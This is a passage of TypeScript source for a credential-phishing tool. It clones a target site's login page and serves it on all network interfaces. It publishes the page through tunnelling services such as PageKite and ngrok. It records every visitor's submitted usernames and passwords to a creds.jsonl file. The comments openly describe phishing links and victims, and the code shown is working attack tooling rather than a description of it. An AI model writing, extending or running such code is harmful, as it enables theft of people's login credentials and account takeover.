   * PageKite is the shipped worldwide forwarder: every phishing link is
   * meant to go out through it. The others stay as fallbacks so a box
   * without a kite name still gets a public URL when it can. A campaign
   * without a public URL is still useful on the LAN — the local bind is
   * always printed — so a total miss is an error string, not an exception. */
  const attempts = [openPagekite, openCloudflared, openNgrok, openLocaltunnel];
  const errors: string[] = [];
  for (const opener of attempts) {
    const tun = await opener(port);
    if (tun.ok) return tun;
    if (tun.error) errors.push(tun.error);
  }
  return new Tunnel({ error: errors.join('; ') || 'no tunnel tool available' });
}

// === SECTION === Server ===

/** Every request/credential event a campaign emits (and logs). */
export type PhishEvent =
  | {
      kind: 'ready';
      host: string;
      local: string;
      public: string;
      tool: string;
      clone: string;
      cloned: boolean;
      tunnelError: string;
      ts: number;
    }
  | {
      kind: 'hit' | 'cred';
      method: string;
      path: string;
      fields: Record<string, string>;
      user: string;
      password: string;
      ts: number;
    }
  | { kind: 'stopped'; host: string; hits: number; creds: number; ts: number };

export type LogFn = (event: PhishEvent) => void;

function freePort(): Promise<number> {
  return new Promise((resolve, reject) => {
    const srv = net.createServer();
    srv.on('error', reject);
    srv.listen(0, '127.0.0.1', () => {
      const addr = srv.address() as net.AddressInfo;
      const port = addr.port;
      srv.close(() => resolve(port));
    });
  });
}

function readBody(req: http.IncomingMessage): Promise<Buffer> {
  return new Promise((resolve, reject) => {
    const chunks: Buffer[] = [];
    req.on('data', (c: Buffer) => chunks.push(c));
    req.on('end', () => resolve(Buffer.concat(chunks)));
    req.on('error', reject);
  });
}

function parseBody(raw: Buffer, contentType: string): Record<string, string> {
  const ctype = (contentType || '').toLowerCase();
  if (ctype.includes('application/json')) {
    let data: unknown;
    try {
      data = JSON.parse(raw.toString('utf8') || '{}');
    } catch {
      return { _raw: raw.toString('utf8') };
    }
    if (data !== null && typeof data === 'object' && !Array.isArray(data)) {
      const out: Record<string, string> = {};
      for (const [k, v] of Object.entries(data as Record<string, unknown>)) {
        out[k] = v === null ? '' : String(v);
      }
      return out;
    }
    return { _raw: JSON.stringify(data) };
  }
  // Default: application/x-www-form-urlencoded (and anything else we can
  // parse). URLSearchParams iterates in order, so overwriting gives the
  // LAST value — Python parse_qs keeps blanks and takes v[-1].
  const out: Record<string, string> = {};
  for (const [k, v] of new URLSearchParams(raw.toString('utf8'))) {
    out[k] = v;
  }
  return out;
}

function sendRes(
  res: http.ServerResponse,
  code: number,
  body: string,
  ctype = 'text/html; charset=utf-8',
): void {
  const data = Buffer.from(body, 'utf8');
  res.writeHead(code, {
    'Content-Type': ctype,
    'Content-Length': String(data.length),
    'Cache-Control': 'no-store',
  });
  res.end(data);
}

export interface CampaignOptions {
  fetch?: boolean;
  tunnel?: boolean;
  port?: number;
}

export class Campaign {
  /** One live phishing campaign: page + server + tunnel + log.
   *
   * The HTTP server runs on the Node event loop (the Python original used a
   * daemon thread) so the TUI stays responsive. Every request is appended to
   * `hits.jsonl` and pushed to *onEvent* (the UI subscribes). `stop()` tears
   * the whole thing down. */

  readonly rawTarget: string;
  readonly host: string;
  url: string;
  readonly directory: string;
  onEvent: LogFn | null;
  readonly startedAt: number;
  readonly hits: PhishEvent[] = [];
  readonly creds: PhishEvent[] = [];
  tunnel = new Tunnel();
  readonly port: number;
  readonly localUrl: string;
  publicUrl = '';
  cloneNote = '';
  cloned = false;
  pageHtml = '';
  readonly thanksHtml: string;
  readonly logPath: string;
  readonly credsPath: string;
  alive = false;
  private server: http.Server | null = null;

  private constructor(
    target: string,
    directory: string,
    onEvent: LogFn | null,
    port: number,
  ) {
    this.rawTarget = target;
    this.host = normaliseTarget(target);
    this.url = targetUrl(target);
    this.directory = directory;
    this.onEvent = onEvent;
    this.startedAt = Date.now() / 1000;
    this.port = port;
    this.localUrl = `http://127.0.0.1:${this.port}/`;
    this.thanksHtml = thanksPage(this.host || 'account');
    this.logPath = path.join(this.directory, 'hits.jsonl');
    this.credsPath = path.join(this.directory, 'creds.jsonl');
  }

  static async create(
    target: string,
    directory: string,
    onEvent: LogFn | null = null,
    opts: CampaignOptions = {},
  ): Promise<Campaign> {
    // Python: `int(port) if port else _free_port()` — port 0 is falsy there,
    // so it means "pick one", not "bind port 0".
    const port = opts.port || (await freePort());
    const camp = new Campaign(target, directory, onEvent, port);

    if (opts.fetch !== false) {
      const [fetched, note, used] = await cloneLogin(target);
      if (used) camp.url = used;
      camp.cloneNote = note;
      [camp.pageHtml, camp.cloned] = buildPage(camp.host, camp.url, fetched);
    } else {
      camp.cloneNote = 'template (fetch skipped)';
      [camp.pageHtml, camp.cloned] = buildPage(camp.host, camp.url, null);
    }

    fs.writeFileSync(path.join(camp.directory, 'index.html'), camp.pageHtml, 'utf8');
    // on-disk key format kept verbatim from the Python original (nothing
    // parses meta.json programmatically; it is evidence for humans).
    fs.writeFileSync(
      path.join(camp.directory, 'meta.json'),
      JSON.stringify(
        {
          host: camp.host,
          url: camp.url,
          cloned: camp.cloned,
          clone_note: camp.cloneNote,
          started_at: camp.startedAt,
        },
        null,
        2,
      ) + '\n',
      'utf8',
    );

    camp.startServer();
    if (opts.tunnel !== false) {
      camp.tunnel = await openTunnel(camp.port);
      if (camp.tunnel.ok) camp.publicUrl = camp.tunnel.url;
    }
    camp.alive = true;
    camp.emit({
      kind: 'ready',
      host: camp.host,
      local: camp.localUrl,
      public: camp.publicUrl,
      tool: camp.tunnel.tool,
      clone: camp.cloneNote,
      cloned: camp.cloned,
      tunnelError: camp.tunnel.error,
      ts: Date.now() / 1000,
    });
    return camp;
  }

  // ---- http -------------------------------------------------------------
  private startServer(): void {
    const campaign = this;
    const server = http.createServer((req, res) => {
      void campaign.handle(req, res).catch(() => {
        /* a failed request must not take the campaign down */
      });
    });
    // Bind on all interfaces so a LAN victim (and a tunnel daemon) can
    // reach it. The printed URL stays on 127.0.0.1 because that is the
    // address the operator opens; the tunnel talks to the same port.
    server.listen(this.port, '0.0.0.0');
    this.server = server;
  }

  private async handle(
    req: http.IncomingMessage,
    res: http.ServerResponse,
  ): Promise<void> {
    const u = req.url ? new URL(req.url, 'http://localhost') : null;
    const pathname = u?.pathname ?? '/';
    if (req.method === 'GET') {
      if (pathname === '/__andy_thanks') {
        sendRes(res, 200, this.thanksHtml);
        return;
      }
      if (
        pathname === '/' ||
        pathname === '/index.html' ||
        pathname === '/login' ||
        pathname === '/signin'
      ) {
        this.hit('GET', pathname, {});
        sendRes(res, 200, this.pageHtml);
        return;
      }
      if (pathname === '/favicon.ico') {
        res.writeHead(204);
        res.end();
        return;
      }
      this.hit('GET', pathname, {});
      sendRes(res, 200, this.pageHtml);
      return;
    }
    if (req.method === 'POST') {
      const raw = await readBody(req);
      const fields = parseBody(raw, req.headers['content-type'] ?? '');
      this.hit('POST', pathname, fields);
      sendRes(res, 200, this.thanksHtml);
      return;
    }
    // Python's BaseHTTPRequestHandler answers unimplemented methods with 501
    // ("Unsupported method"); match it rather than the closer-but-wrong 405.
    res.writeHead(501);
    res.end();
  }

  private hit(method: string, pathName: string, fields: Record<string, string>): void {
    const hasFields = Object.keys(fields).length > 0;
    const [user, password] = hasFields ? pickCredentials(fields) : ['', ''];
    const event: PhishEvent = {
      kind: password || (hasFields && user) ? 'cred' : 'hit',
      method,
      path: pathName,
      fields,
      user,
      password,
      ts: Date.now() / 1000,
    };
    // Python guards this block with a threading.Lock because its HTTP server
    // is multi-threaded; Node is single-threaded and these appends are sync,
    // so the critical section cannot interleave.
    this.hits.push(event);
    if (event.kind === 'cred') {
      this.creds.push(event);
      this.append(this.credsPath, event);
    }
    this.append(this.logPath, event);
    this.emit(event);
  }

  private append(filePath: string, event: PhishEvent): void {
    try {
      fs.appendFileSync(filePath, JSON.stringify(event) + '\n', 'utf8');
    } catch {
      /* a full disk must not crash the campaign */
    }
  }

  private emit(event: PhishEvent): void {
    if (this.onEvent === null) return;
    try {
      this.onEvent(event);
    } catch {
      /* a broken subscriber must not crash the campaign */
    }
  }

  // ---- lifecycle --------------------------------------------------------
  stop(): void {
    this.alive = false;
    this.tunnel.stop();
    const server = this.server;
    this.server = null;
    if (server !== null) {
      try {
        server.close();
      } catch {
        /* already closed */
      }
      try {
        server.closeAllConnections();
      } catch {
        /* not available / already closed */
      }
    }
    this.emit({
      kind: 'stopped',
      host: this.host,
      hits: this.hits.length,
      creds: this.creds.length,
      ts: Date.now() / 1000,
    });
  }
}

// A module-level handle so the UI and a future `/phish stop` share one
// campaign. Only one runs at a time — a second `/phish` replaces the first.
let _active: Campaign | null = null;

export function active(): Campaign | null {
  return _active;
}

export async function start(
  cfg: PhishConfig,
  target: string,
  onEvent: LogFn | null = null,
  opts: CampaignOptions = {},
): Promise<Campaign> {
  /** Stop any running campaign, then start a new one. */
  const directory = campaignDir(cfg, target);
  const camp = await Campaign.create(target, directory, onEvent, opts);
  const old = _active;
  _active = camp;
  if (old !== null) {
    try {
      old.stop();
    } catch {
      /* the replacement proceeds regardless */
    }
  }
  return camp;
}

export function stop(): Campaign | null {
  /** Stop the running campaign, if any. Returns it (now dead) or null. */
  const camp = _active;
  _active = null;
  if (camp !== null) camp.stop();
  return camp;
}
